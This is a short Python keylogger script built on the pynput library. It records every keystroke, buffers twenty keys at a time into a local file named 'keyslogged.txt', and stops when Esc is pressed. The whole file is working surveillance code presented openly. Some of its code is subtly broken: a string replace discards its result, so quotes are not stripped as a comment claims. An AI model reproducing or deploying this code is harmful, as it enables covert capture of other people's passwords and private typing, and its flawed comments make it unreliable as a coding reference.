# -*- coding: utf-8 -*-
"""
Created on Fri Oct 25 08:18:35 2019

@author: Salman Ahmad
"""

import os.path
from pynput.keyboard import Key,Listener

count=0
keys=[]
def myon_press(key):
    global keys,count
    keys.append(key)
    count+=1
    #print("{0} pressed ".format(key))
    if count >=20:
        write_file(keys)
        count=0
        keys=[]

def write_file(keys):
    if os.path.isfile("keyslogged.txt"):#if file exists append to it
        with open("keyslogged.txt","a") as f: #w will create the file if it isn't already created, a here will append content
            for key in keys:
                k=str(key)
                k.replace("'","") #without this line the system records every key within a quotation mark
                if k.find("space")>0: #if the user enters space then enter a new new line to make text file readable
                    f.write("\n")
                elif k.find("Key")==-1:#if key is any else key record it in the textfile
                    f.write(k)
    else:#if file doesn't exist create it and start writing
        with open("keyslogged.txt","w") as f: #w will create the file if it isn't already created, a here will append content
            for key in keys:
                f.write(str(key))


def myon_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=myon_press,on_release=myon_release) as listener:
    listener.join()